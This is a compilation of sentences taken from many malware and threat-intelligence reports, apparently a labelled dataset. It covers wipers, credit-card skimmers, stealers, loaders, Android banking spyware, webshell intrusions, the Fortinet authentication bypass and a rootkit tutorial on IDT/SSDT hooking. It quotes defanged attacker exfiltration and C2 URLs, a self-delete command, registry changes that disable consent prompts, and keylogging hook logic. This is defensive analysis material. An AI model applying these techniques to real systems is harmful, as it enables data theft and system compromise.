1	The entry point of the PE header points to the _CorExeMain or _CorDllMain of the mscoree.dll, while the actual entry point can be found in the Cor20 header as shown in Figure 2.
1	The malware sample has a single import, _CorExeMain, from mscoree.dll, consistent with other .NET executable files.
1	It contains only .text and .reloc sections, all of which are native to the PE file format and have fairly low entropy.
1	The CIL bytecode uses obfuscation to hide the string resources that are critical for pattern based detection.
1	It also interleaves random code among actual operations, together with flattened control flow, to make the code harder to follow.
1	However, we can glean a lot about the objective of this malware by observing the imported libraries and associated API calls found in the decompiled code.
1	The most significant signs of malicious code usage are the calls to the unmanaged DLL functions.
1	Platform Invoke (P/Invoke) enables the managed codes in .NET to call the unmanaged functions.
1	Calling the lower level APIs directly is a well known anti-analysis technique to evade API hooking by sandbox.
1	However, this sample intends to operate at a lower level with some of the unmanaged APIs in ntdll.dll.
1	An example decompiled code snippet where the sample uses regular expressions to search the target files.
1	Though obfuscation exists, we are still able to get the argument FsControlCode for the call to ntdll.NtFsControlFile, which is 0x980c8 = FSCTL_SET_ZERO_DATA.
1	This is how the wiper writes 4K of null bytes to a targeted file that was opened by ntdll.NtOpenFile.
1	The sample calls ntdll.RtlAdjustPrivilege several times with privileges 9, 17, 18 and 19.
1	These privileges are SeTakeOwnershipPrivilege, SeBackupPrivilege, SeRestorePrivilege and SeShutdownPrivilege respectively.
1	These privileges are used to ensure the wiper has the access right to destroy the target file and reboot the system after all the actions are done.
1	Unlike HermeticWiper and ransomware like LockBit, DoubleZero doesnt delete the shadow copies that can possibly be used to recover files from the damage.
1	However, the wiper does kill any process named lsass.
1	The first page of the PDF only includes an Im not robot [sic] CAPTCHA human authentication.
1	The second page is filled with crammed sentences.
1	While the redirection in that attack did not work, redirection did occur in this recent PDF after just clicking the checkbox.
1	Since the checkbox is on the first page, all it requires for redirection is for the recipient to click the checkbox.
1	The message cannot be viewed until the user manually scrolls down through the document.
1	The reason why a PDF from last year was re-used may be because file names hold little significance for careless users.
1	The user is first redirected to the website leonvi[.]ru , and then redirected again to a fake Amazon loyalty program site that claims the user was randomly chosen for a survey.
1	This same attack could drop malware, load potentially unwanted applications, or launch a vulnerability exploit if the attacker chose to do so.
1	Typosquatting is a type of cyberattack that leverages URLs mistyped by users.
1	com redirects the visitor to what appears to be an online lottery site, which has nothing to do with Black Friday.
1	Visiting this site redirects the user to totalav[.]com, a Web site of security solution software in a likely attempt to generate legitimate affiliate traffic and credits.
1	Since the attacker can choose any redirection destination, some previous visitors may have been even more unlucky, accidentally generating affiliate traffic for the attacker or being targeted with malware.
1	When we ran some searches by typing a search term in the Chromnius address bar, we appeared to be redirected a few times before the search was finally executed on Yahoo.
1	The redirections we observed were as follows:
1	First search: chromnius[.]com/results.php?...[search term] ->First redirection: zipsearch[.]xyz/apiv2/bosy/search?p=[search term] ->Second redirection:search[.]onlinegamezone[.]club/chrome/newtab/search.aspx?q=[search term]& ->Legitimate search on YahooEven more strange, zipsearch[.]xyz and search[.]onlinegamezone[.]club
1	The JavaScript skimmer code was hosted on attacker-registered domains and the link to these skimmers was injected in the compromised e-commerce sites.
1	We identified 2 unique domains used in this attack by the threat actor.
1	It is worth noting that both these domains have very little to no detection on VirusTotal which indicates that the threat actor was able to stay under the radar.
1	This CC Skimmer is hosted at the URL: hxxps://modersecure[.]com/sources.200x/google-analytics.js
1	Uses the setInterval() function to check every 1.5 seconds whether the current URL contains the string "/checkout/#payment".
1	Calls the findBtnAddAction() function which uses HTML DOM to locate the payment button on the page.
1	Event Listener calls the sendCardData() function which further calls the getCardData() function to retrieve the payment card data information.
1	This information will be base64-encoded and sent to the attacker's data exfiltration URL.
1	In this case it is: modersecure[.]com/sources.200x/analytic.php.
1	The info is exfiltrated using navigator.sendBeacon() function which sends an HTTP POST requestCollection of payment card information.
1	Searches for the string: "/checkout/" in the URL to ensure the user is at the checkout page
1	Searches for the string: "f04bf6162ed8779acc1205ac37f8fc4a" in the cookie.
1	Once both the above conditions are satisfied, the skimmer is activated.
1	Navigates the HTML DOM to locate the shipping and item related information about the order.
1	Uses the HTML DOM to locate the payment card information related to Moneris
1	Exfiltrates the information using the pixtar() function which creates an image tag and sets the source to the exfiltration URL: artmodecssdev[.]art/secure/av/secure.php.
1	In May 2022, a new domain - payment-analytics[.]info was registered and used in a skimming attack against several Magento and PrestaShop-based e-commerce stores.
1	Interestingly, this domain was hosted on the IP address: 45.61.136[.]218 which is in the same subnet as 45.61.136.204 (an IP address previously used by Lazarus APT group).
1	The skimming code itself is straightforward.
1	It captures the credit card information by searching for HTML fields corresponding to the payment processor used by the targeted store (in this case - Authorize.Net).
1	The collected information is exfiltrated by sending an HTTP POST request to payment-analytics[.]info/validate/<random_id>
1	Adds an event listener for the click event on "place order" button by locating the HTML button element with id and class: "#co-payment-form button.action.checkout.primary".
1	Fetches the payment card information using document.querySelector() depending on the payment processor used by the targeted store
1	Sends a GET request to the REST API endpoint: "/rest/default/V1/guest-carts/" to retrieve value of "billing_address" member which corresponds to shipping information entered by the victim
1	Extracts key info from billing_address, appends it to the payment card information and sends it to the attacker's server using an HTTP POST request.
1	Unlike the other skimmers discussed in this blog so far, this specific variant did not check whether the user is on the payment checkout page.
1	It used the HTML DOM to locate the HTML fields corresponding to payment card information.
1	The specific values it searches to locate the information would depend on the type of payment processor used by the targeted store.
1	This information was concatenated along with the user's details, base64-encoded and exfiltrated to the attacker's server.
1	The exfiltration URI path remained consistent across all the skimmers in this campaign.
1	The skimmer locates the payment button using the pattern "*[onclick*=\"payment.save()\"]" and adds an event listener for the click event.
1	The exfiltration function is invoked as soon as the above button is clicked.
1	Unlike the skimmers discussed earlier, in this case, it extracts all the input fields using: jQuery("body input, body select, body option").
1	All this collected information is base64-encoded and stored in the variable - payment[string] to send to the exfiltration URL using an HTTP POST request.
1	The exfiltration URL in this case is: cdn-common[.]com/default/loading.gif
1	Among notable changes, the malware developer added an interesting feature to the administration panel of the BlueFox Stealer version 2.0.7 to allow traffers teams to operate the malware builds internally.
1	Thus, traffers teams distributing the BlueFox Stealer have statistics related to each traffer (also named worker) and can give it access  making the integration of the BlueFox Stealer easier into the traffers teams resources.
1	In other words, each traffer of the team can monitor statistics related to the distribution of their build on a non-authenticated webpage, and therefore have an assessment of the impact of their work.
1	The BlueFox Stealer v2 capabilities advertised by distamx are those of a classic information stealer, with a focus on cryptocurrency wallets, and file grabber and loader capabilities.
1	BlueFox exfiltrates the collected data to its C2 server using socket communication via native protocol on TCP/IP in encrypted form.
1	The malware removes itself from the infected host using the Windows command cmd.exe /C timeout 5 & del "$PATH.
1	Bumblebee is in constant evolution, which is best demonstrated by the fact that the loader system has undergone a radical change twice in the range of a few days  first from the use of ISO format files to VHD format files containing a powershell script, then back again.
1	The Bumblebee loader usually comes in the form of a DLL-like binary packed with a custom packer.
1	The method by which this DLL is delivered seems to be subject to change on the whims of the threats adventurous developers: while the prevailing method is to embed the packed DLL directly inside another file (usually an ISO), during a short stint in June the malwares operators experimented with using VHD files that executed PowerShell downloading and decrypting the packed DLL itself (packed with a very different packer), as documented by Deep Instinct.
1	This trend seems to have died out and now the DLL can be found directly embedded in the 1st-stage file again, whether an ISO or a VHD.
1	Once unpacked, Bumblebee will perform checks to avoid being executed in sandboxing or analyst environments; most of the code responsible for this is open source, lifted directly from the Al-Khaser project.
1	If these checks pass, Bumblebee proceeds to load its configuration into memory.
1	This is done by loading four pointers from its .data section which point to four different buffers in a contiguous encrypted configuration struct.
1	The first of these points to an 80-byte section that stores an RC4 ascii key (much shorter in all cases weve observed).
1	The other three pointers point to two 80-byte sections and a 1024-byte section, all of which contain data that is then decrypted using the above-mentioned RC4 key.
1	Once decrypted, the first 80-byte buffer in most of the samples to date has simply contained the number 444; the malware makes no use of this number so its significance is not clear.
1	The second buffer contains an ASCII code which is called group_name by the malware.
1	Finally, the 1024-byte block contains a list of command and control servers (most of them are usually fake).
1	Bumblebee computes a machine-specific pseudorandom victim ID (internally named client_id) via the usual method of concatenating some immutable machine parameters (in this case, machine name and GUUID) and then calculating a hash of the result (in this case, an MD5 digest).
1	Using this data and some other elements collected from the victim system, Bumblebee builds a C&C check-in in JSON format
1	This string is encrypted using the same RC4 key used earlier for the configuration, and repeatedly sent to its C2 server with random delays between 25 seconds and 3 minutes regardless of whether the server responds or its down.
1	The response from the command and control server is also in JSON format and also encrypted with the same RC4 key (we appreciate this elegant design and encourage malware authors to aspire to this standard of legibility).
1	The content of the response itself naturally varies, and can be for example an empty response:
1	Or some payload to inject or execute:
1	In the case of receiving a payload, the structure of the response will contain a list of elements in the tasks section of the json, each with a command and a payload.
1	Each of the elements will contain, among others, a task field with the name of the command to be executed, and a base64 encoded payload inside a section called task_data.
1	Once a client_id was generated for an infected victim and sent to a command and control server, that command and control server would stop accepting other different client_id codes from that same victim external IP.
1	This means that if several computers in an organization, accessing the internet with the same public IP were infected, the C2 server will only accept the first one infected.
1	Notably, despite having a field called group_name hardcoded in every sample, this value is sent in each request to the command and control server.
1	Further, the above-described one client_id per IP address policy curiously seemed to apply across different group_names  but not across different RC4 encryption keys, which seems to imply the use of several group_names by what is effectively the same botnet, possibly to mark different campaigns or different sets of victims.
1	As a result, grouping activity by encryption key seems to be a more coherent approach than grouping by group_name.
1	This hypothesis is further supported by the fact that weve observed several samples with the same RC4 key and different group_name acting identically and dropping the same threats within a very close time range, while samples that differ in their used RC4 key exhibit completely different behavior.
1	The fact that command and control servers with different IP addresses contacted by different samples using the same RC4 key are returning the same payloads and blocking the same client_id for their victims also suggests that these IP addresses actually only act as fronts for a main command and control server to which all Bumblebee connections are relayed.
1	To deploy a threat, of the 5 commands supported by bumblebee, 3 lead to code being downloaded from the C2 server and executed:
1	DEX: deploys an executable to disk and runs it.
1	DIJ: Injects a library into a process and executes it.
1	SHI: injects and executes shellcode into a process.
1	While the victims geographical location didnt seem to have any effect on the malware behavior, we observed a very stark difference between the way Bumblebee behaves after infecting machines that are part of a domain (a logical group of network that share the same Active Directory server), as opposed to machines isolated from a company network that are connected to a workgroup (a Microsoft term to denote a peer to peer local area network).
1	If the victim is connected to WORKGROUP, in most cases it receives the DEX command (Download and Execute), which causes it to drop and run a file from the disk.
1	On the other hand, if the victim is connected to an AD domain, it generally receives DIJ (Download and Inject) or SHI (Download shellcode and Inject) commands.
1	In these cases, the resulting threats have been payloads from more advanced post-exploitation frameworks, such as CobaltStrike, Sliver or Meterpreter.
1	In these cases, it has also been observed that regardless of the IP of the command and control server and the group_name field, samples with the same RC4 key drop the same Cobalt Strike beacons with the same Team servers, which has proven to be a very useful means of relating different samples to each other as part of the same botnet.
1	One last interesting feature of the payloads dropped by Bumblebee is that both the binaries downloaded using the DEX command and those downloaded with the DIJ command are in many cases packaged using the same Bumblebee packer.
1	The initial downloaded Word document has no malicious code.
1	But once the victim opens the Word document, it will try to retrieve a malicious macro-enabled template from a remote server.
1	The technique is known as Remote Template Injection and is commonly used to evade static detection.
1	After loading the remote template, it will then prompt the user in enabling macro content.
1	The template has Base64 binary files which are contained in the VBA UserForm.
1	These binaries will be decoded and dropped by the custom VBA functions in the template.
1	The binaries that will be dropped are as follows:%APPDATA%\Microsoft\Windows\COM Surrogate\dllhost.exe (ClipBanker)C:\cfe91497d9137b2\ffd0.exe (Coinminer downloader)%TEMP%\instx.exe (Coinminer loader),C:\cfe91497d9137b2\COVID-19.docx (Injected Word document)
1	The first binary dropped is an infostealer known as ClipBanker.
1	This threat monitors the clipboard and replaces cryptocurrency wallet addresses in the infected system with the threat actors own.
1	The macro script creates a registry startup key as a form of persistence.
1	To begin the mining process, the loader will start the downloader and it will then try to elevate the user privilege.
1	Next, the downloader fetches the main payload from a remote server, a coin miner and its configuration files.
1	The coin miner will then be saved as chrome.exe to masquerade itself as a web browser.
1	Also, a registry startup key is added for the persistence of the coin miner.
1	The macro-enabled template also embedded a copy of the original Word document in the VBA UserForm.
1	The embedded Word document is dropped at C:/cfe91497d9137b2/COVID-19.docx.
1	The template can propagate itself beyond the infected system.
1	This is done by hijacking the victims Outlook application via some macro VBA code, and harvesting the contact list.
1	Figure 6.Macro script looping through the victims inbox collecting sender names and email addresses.
1	Macro script looping through the victims inbox collecting sender names and email addresses.
1	The macro will then send an email to each of the victims contacts with a copy of the COVID-19 themed document as an attachment.
1	Finally, the sent emails will be deleted by the macro script in an attempt to cover its tracks and remove evidence.
1	A new miner sample showed up in April on AT&T Alien Labs radar, with a wide range of different loaders aiming to execute it in infected systems up to this day.
1	The loaders were initially delivered to the victims through an executable disguised like a spreadsheet.
1	For example, one of the samples (fd5131645025e199caa142c12cef34b344437a0f58306f9b66c35d32618665ba) carries a Microsoft Excel icon, but its file extension corresponds to an executable.
1	At the time of execution, the first activities performed are registry changes to cloak the malware samples.
1	For example, by setting HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt to 1, the attackers are hiding the file extensions and camouflaging the executables as documents.
1	Additionally, the registry key HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden is set to 0 to avoid displaying in explorer the hidden files dropped during execution.
1	Finally  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin is set to 0 in order to execute any future samples with elevated privileges without explicit consent in the form of a pop up or inserting credentials.
1	The initial payload drops another executable file while opening the spreadsheet in Figure 1.
1	This additional executable attempts to look like a legitimate executable.
1	It is named CmRccService.exe and has the same filename as the metadata associated with the products name, description and comments.
1	It is probably an attempt to masquerade the process by making it similar to the legitimate Microsoft process CmRcService.exe (Configuration Manager Remote Control Service) (T1036.004).
1	The RegistryManager samples even carry a Copyright flag associated with Microsoft Corporation, lacking once again the corresponding file signature.
1	These files are allocated under the folder C:\Windows\ImmersiveControlPanel in an attempt to make the processes look as legitimate as possible.
1	Persistence of the whole process is attempted during the execution of CmRccService.exe.
1	This loader reaches out to several domains hosting the payloads for next stages, configuration files and one-line commands to be executed.
1	Before executing the third stage payload, Cmrcservice performs several modifications to the FireWall to allow inbound and outbound connections to the files it will drop afterwards.
1	Furthermore, the malware includes exclusions to the Microsoft Windows Defender for the folders from where the malware will be executing or the files it intends to execute (T1562).
1	The third stage payload is formed by the p.exe executable, which doesnt hide its contents, since the files metadata claims the filename is payload.exe.
1	During execution, p drops two additional files: oidz.exe and umxn.exe, which correspond to the final payloads.
1	Oidz.exe runs an infinite loop, as seen in Figure 4, that will reach out to the Command & Control (C&C) looking for new commands to execute.
1	After execution, it includes a sleep command to separate the requests for additional commands as well as its executions.
1	The commands to be executed are uploaded by the attackers to the C&C servers, and oidz reaches out to specific files in the server and executes them, allowing the attackers to maintain any payload updated or modify its capabilities (T1102.003).
1	Finally, umxn.exe corresponds to the crypto miner that will run with the configuration pulled from one of the C&C and stored in %windir%\Help\Windows\config.json.
1	An authentication bypass using an alternate path or channel vulnerability [CWE-288] in FortiOS, FortiProxy, and FortiSwitchManager may allow an unauthenticated attacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests, as mentioned in Fortinet Advisory.
1	While targeting affected versions of Fortinet products, an attackertakes advantage of a controlling mechanism ina function responsible for evaluating the affected devices access to the REST API functionality.While exploiting this vulnerability, the attacker adds an SSH key to the admin user, enabling access to SSH into the affected system as admin, as shown in the Tweet below.
1	An attacker can update or add a valid public SSH key to a targeted account on a system and can then typically gain complete access to that system.
1	Additionally, the Threat Actor could launch other attacks against the rest of the IT environment with the foothold and knowledge gained through exploiting this vulnerability.
1	Modify the admin users SSH keys to enable the attacker to log in to the compromised system.
1	Add new local users.
1	Initiate packet captures to capture other sensitive system information.
1	The sensitive system information, system configurations, and network details might be further distributed over the darkweb
1	While during routine monitoring, researchers at Cyble observed a Threat Actor (TA) distributing multiple unauthorized Fortinet VPN access over one of the Russian cybercrime forums, as shown in the figure below.
1	While analyzing the access (figure 5), it was found that the attacker was attempting to add their own public key to the admin users account.
1	As per intelligence gathered from sources, the victim organizations were using outdated FortiOS.
1	As per intelligence gathered from sources, the victim organizations were using outdated FortiOS.
1	Hence, with high confidence, we conclude that the Threat Actor behind this sale exploited CVE-2022-40684.
1	Using the Forwarded header, an attacker is able to set theclient_ipto 127.0.0.1.
1	The trusted access authentication check verifies that the client_ipis 127.0.0.1 and theUser-Agentis Report Runner, both of which are under the attackers control.
1	The App names given to the spyware are SBI rewards and other names related to a few other major private banks apps.
1	The malware requests for Know Your Customer (KYC) documents such as address proof (govt.ID), PAN Card, and users selfie as shown in the below figure.
1	The malware also prompts the user to input their card details as shown below.
1	The malware displays a fake page to steal email account credentials across various email service providers as shown in the below figure.
1	The malware requests the user for 11 different permissions.
1	Out of these, it abuses 5 permissions.
1	PermissionsDescriptionGET_ACCOUNTSAccess accounts details in the deviceREAD_SMSAccess SMSs in the device database (DB).RECEIVE_SMSIntercept SMSs received on the victims deviceREAD_CALL_LOGAccess Call LogsMODIFY_AUDIO_SETTINGSModify audio settings
1	From our static analysis, we noticed that the malware is not using obfuscations techniques such as complex class names or encrypted strings.
1	The spyware collects this information and uploads the data to a Command and Control (C&C) server.
1	The TA controls the malware using commands send from this C&C.
1	The financial spyware utilizes multiple servers for uploading the collected data and also to receive commands from the TA.
1	The malware uses an open-source library, socket.io to communicate with C&C servers.
1	The malware encrypts the data before every upload.
1	The data is encrypted using a combination of AES encryption and Base64 encoding as shown in the code below.
1	During our traffic analysis, we identified that the malware communicated to a URL: hxxps://testchat8564.herokuapp[.]com/socket.io/?EIO=3&transport=polling that is hosted on a free hosting service as shown in the below figure.
1	We identified that the malware sends the SMS data to TAs C&C server hxxp://datasmsalluser[.]in/saver.php as shown in the below figure.
1	The malware sends the call logs data to TAs C&C server hxxp://datasmsalluser[.]in/savercall.php as shown in Figure 19.
1	We identified that the malware encrypts the SMS data and sends it to the C&C server hxxps://testchat8564.herokuapp[.]com/socket.io/?EIO=3&sid=v2vV83VUIP8wo08LAAFt&transport=polling as shown in below figure.
1	During our intrusion analysis of DeftToreros webshells, such as Caterpillar, we noticed traces that infer the threat actor possibly exploited a file upload form and/or a command injection vulnerability in a functional or staging website hosted on the target web server.
1	This assumption is based on the fact that the uploaded webshells always drop in the same web folder, and in some cases get assigned a name containing a GUID followed by the original webshell filename.
1	In other instances, we noticed traces pointing to a possible exploitation of IIS PHP plugins pre-installed by the server admins.
1	And finally, in some other instances, we suspect the operators gained server credentials from other systems in the same organization and logged in using a remote desktop (MSTSC.exe) to deploy the webshell.
1	Once the threat actor succeeds in identifying a method to upload a webshell, they attempt to drop several webshell types and families, most of which are blocked by the AV engine.
1	Upon successful installation of the webshell, the operators run multiple commands to gain situational awareness from the exploited system.
1	This includes testing network connectivity by pinging Google.com, listing current folders, identifying the current user privileges, enumerating local system users, and listing websites hosted by the compromised server.
1	The operators also attempt to assess if the web server is joined and/or trusted by any domain.
1	After gaining situational awareness, the operators attempt to load/invoke a number of tools to dump local and domain credentials.
1	In some cases, the threat actor attempts to install Nmap and Advanced Port Scanner, possibly to scan internal systems.
1	In some instances, Lazagne.exe was used, in others Mimikatz variants were used either by executing the respective PE binary or by invoking a base64-encoded PowerShell version from a GitHub project.
1	In a smaller number of instances, possibly due to AV detection, the operators dumped the LSASS.exe process to disk, most probably to process it offline for credential dumping.
1	Once credentials are obtained, it is believed the operators use Remote Desktop Protocol to pivot into internal systems, or reachable systems that are likely using the stolen credentials (e.g., trusted partners).
1	This is also reinforced by timeline analysis where the threat actor deployed a webshell at another web server in the same network without exploiting a file upload form/vulnerability.
1	Further commands were executed to bypass the AV engine and establish a Meterpreter session with the operators C2 server.
1	After a Meterpreter session is established, the operators attempt to again invoke Mimikatz variants to gain system and/or domain credentials.
1	Its worth mentioning that in older intrusions, the threat actor deployed Explosive RAT instead of using Meterpreter.
1	While the same credential dumping strategy has been used by the operators in most intrusions, there were some instances where few modifications were seen.
1	For example, the operators used the VSSADMIN system tool to create a shadow copy snapshot on the targeted server in an attempt to dump domain credentials, a technique also used in pentesting and red team engagement.
1	Create a volume shadow copy to collect SAM and SYSTEM registry hives from local system, or NTDS.DIT and SYSTEM hives if on a domain controller
1	A second noticeable change made to evade defense was introduced to the function names exported by the DLL component of Explosive RAT.
1	As an example of how the OS layers are built on top of each other, lets take a look at a kernel32.dll API function such as ReadFile.
1	When ReadFile is invoked, the implementation that resides in kernel32.dll will parse the parameters passed to it and will call the undocumented NtReadFile in ntdll.dll.
1	Later, NtReadFile will set eax with the appropriate syscall number and will execute the SYSENTER instruction (or SYSCALL instruction in x64).
1	The SYSENTER instruction will create a trap and switch to kernel mode by calling the address that is stored in the MSR 0x176 (in x86 or LSTAR MSR in x64) that points to KiFastCallEntry (KiSystemCall64 in x64).
1	This function will save the current user-mode context and will set up the kernel context before finally calling the appropriate kernel version of NtReadFile (also can be referred as ZwReadFile).
1	Its located in ntoskrnl.exe, which will do most of the work and will call the appropriate disk driver to do the actual reading from the disk.
1	When a kernel driver is loaded, it has access to all physical memory (or at least if we dont take VBS and Virtualization into consideration), as well as virtual memory of both Kernel space and user space memory of any user-space process.
1	The attackers used a hook in KeBugCheckEx to resume the execution after the bug check happened, effectively suppressing the BSOD.
1	Then, after Microsoft patched this hole, the attackers hooked a different function, RtlCaptureContext, which is called by KeBugCheckEx to similarly resume the execution without BSOD-ing the system.
1	Another feature that was introduced to Windows  one that has contributed to the decline of rootkits  is DSE (Driver Signature Verification a.k.a Code Integrity verification) for drivers that basically checks that a driver is signed by a trusted certificate authority before loading it.
1	There are also some older Digital Signing Enforcement/Code Integrity bypasses by hfiref0x, such as DSEFix and TDL (Turla Driver Loader).
1	It is important to note that any bug in a rootkit (such as an ACCESS_VIOLATION) would immediately trigger a BSOD.
1	Loading a legitimate signed driver known to be vulnerable, such as in the case of certain versions of VirtualBox and CAPCOM drivers.
1	Triggering an exploit that would run some code with NT AUTHORITY\SYSTEM privileges.
1	Changing global kernel flag g_CiEnabled or g_CiOptions (according to the Windows version) to disable DSE system-wide.
1	Loading a malicious unsigned driver
1	IDT hooking is a technique that patches the IDT table and replaces a specific ISR with a different routine supplied by the attacker.
1	In our example, a routine that will log the values and pass the handling back to the original routine.
1	We start with WinDbg, which we can use to check which IDT entry well need to change to hook the keyboard.
1	By using the !idt extension, we can find that the original ISR index id for i8042prt!I8042KeyboardInterruptService entry is 0x70.
1	If not, it will call GetDescriptorAddress to get the address pointing at the current original ISR and then simply replace it using the same KIDTENTRY struct.
1	The first stage in hooking the IDT is to get the IDT address.
1	This is accomplished by using a special x86 assembly instruction, sidt, which reads a special register called IDTR that holds the IDTs address.
1	The snippet below defines two structures, KIDTENTRY and IDT, and the function GetIDTAddress that uses the sidt instruction to get the IDTs address.
1	GetDescriptorAddress  Gets the interrupt service ID number and calculates the address of the ISR for that interrupt by calculating the offset of the ISR in the IDT and adding the offset to the base address of the IDT (which we get by calling GetIDTAddress defined in the previous snippet).
1	GetISRAddress  Calls GetDescriptorAddress to get an address of an ISR and converts the return value from the KIDTENTRY structure to UINT32 address by taking the Extended offset shifting left by 16 bits and then adding the offset field.
1	These two functions together convert a service index ID to the actual address of an ISR, which we needed in HookIDT to place our hook.
1	The last step is to create a Hook_KeyboardRoutine function that will call our hook handler.
1	After logging the value by calling our Handle_KeyboardHook, we will jump to the original ISR that we saved in oldISRAddress.
1	We do this because we need to divert the execution to its original flow, so no noticeable changes would alarm the user.
1	To execute all the functionality above, our driver should call the HookIDT function in the following way
1	The first parameter passed to HookIDT is 0x70 (the ISR entrys index id), and the second parameter is the function pointer used for the hook implementation.
1	The code above simply traverses the current processs (System) ActiveProcessLinks linked list, according to the offsets defined in the EPROCESS struct.
1	By looking at the public symbols in WinDbg, we can determine the offsets of ActiveProcessLinks (a linked list of type LIST_ENTRY) Flink and Blink and ImageFileName.
1	Once we know the offset, we can compare currImageFileName with the ProcessName that we are looking for and finally remove its list entry if found.
1	When the SYSENTER or INT 0x2e (or SYSCALL in x64) instruction is executed by the processor, the appropriate syscall handler is called after changing the context from user mode to kernel mode.
1	SSDT Hooking is a classic technique used by rootkits (and security software) to achieve control over specific system calls and tampering with their arguments and/or their logic.
1	A classic example would be to hook NtCreateFile, which will basically allow an attacker to tamper with any attempt to get a handle to a file and prevent the user from accessing certain files (such as the rootkits files).
1	The driver should invoke the SSDT hooking by calling the HookSSDT function in the following way: the first parameter is the index parameter to the SSDT entry  x0175, and the second and third parameters are the function to be hooked and the hooking function.
1	In MSR hooking, we hook MSR 0x176 (or LSTAR_MSR 0xc0000082 in x64) that holds the address of the KiFastCallEntry function.
1	By changing this MSRs value, an attacker can divert the execution of all system calls on the system in such a way that they will have a single hook to handle all of them.
1	To distribute the attack chain, the threat actor uses a macro-based Microsoft Word document file.
1	The attack vector is exploiting a third-party Windows package manager to install Serpent.
1	The initial document has a macro showing some of the malicious URL that tries to connect and download the payload.
1	Later, this payload will attempt to connect to a command-and-control C2 server to steal sensitive data.
1	The initial email contains a Microsoft Word document with a malicious macro script.
1	When macros are enabled by the user, the document starts to execute the malicious VBA macro code.
1	Figure 3 below indicates the malicious VBA macro details of the document file in which the malicious URLs are found:hxxps[://]www[.]fhccu[.]com/images/ship3[.]jpg
1	The above-mentioned URL is used to download a ship3.jpg file to the system.
1	The malware is able to detect and extract steganographic embedded data from this file containing base64 encoded PowerShell commands, as shown in Figure 4.
1	The Chocolatey package is downloaded and installed by using this script.
1	The script will also install Python, including the pip package, by using the Chocolatey package.
1	Just like the ship3.jpg above, it contains a base64 encoded PowerShell script that is embedded by steganography.
1	This python script creates a new bat file and executes it.
1	Then executed bat file brings a new python script which has a final serpent payload.
1	The exploit chain wraps up by opening a shortened URL that leads to the Microsoft Office help site.
1	For command and control (C2), the threat actor deploys a Tor proxy, for example:cmd_url_order = hxxp[://]mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd[.]onion[.]pet/index[.]html
1	This Serpent backdoor pings this cmd_url_order server, located at a onion[.]pet Tor proxy domain, on a regular basis.
1	These pings expect responses for the attacker to perform further command action on infected machine to gain access or steal the sensitive data.
1	The malware connects to termbin[.]com, a website associated with a command-line Pastebin application named Termbin, to transmit the results of any specified command.
1	Termbin allows for text to be blindly submitted to a central website and will return a URL to access that data later.
1	The malware will transmit the data and extract this unique URL.
1	The malware then sends a request to the cmd_url_answer server with the hostname and the TermBin URL included in the header.
1	The attacker could use this cmd_url_answer URL to monitor the bin outputs and see what the compromised hosts response.
1	It starts with the APT actor employing the watering hole attack or Phishing email to deliver trojanized Partition Find and Mount software utility on the victims.The Trojanized installer drops multiple malware components in the %temp%daData folder along with configuration files, as shown below.
1	The Launcher component is responsible for executing the Exfiltrate module, which runs another File searcher component.The File searcher component enumerates system drives and looks for target files with specific extensions.
1	The list of extensions is embedded in the StrongPity payload.If the files are found in the victims machine, it will be copied into a temporary zip archive.
1	After completion of adding the files to the archive, it splits into hidden .sft encrypted files.These hidden .sft files are sent to the C&C server through a POST request and are then removed from the disk-based on further C&C command.
1	The Exfiltrate module has commands to delete the .sft files after being sent to the hacker C&C server, as seen in the figure below.
1	Upon execution of the trojanized installer, it extracts and drops encrypted payloads, which is part of its resource section, as shown in the figure below
1	StrongPity payloads such as the Launcher & Persistence component, Exfiltration & Command Execution module, and the File Searcher component are extracted and dropped in the %temp%daData folder.
1	The malware payload creates a mutex named thUseiGpkMkPkFYrIOvKN to mark its existence on the victims system, as shown in the image below.
1	The Exfiltrate component has a hardcoded C&C URL, decoded in the memory as depicted in the debugger image below.
1	As seen in earlier variants, the Parse_ini_file.php is used as part of the layer 1 communication and the functionality to get commands from the C&C server.
1	The network capture depicts multiple connection requests to the attacker layer 1 C&C server (uppertrainingtool[.]com) as showcased in the Wireshark image below.
1	A shortcut file (.LNK) was also seen in the .RAR file, which used a folder icon to make users believe it was another folder.
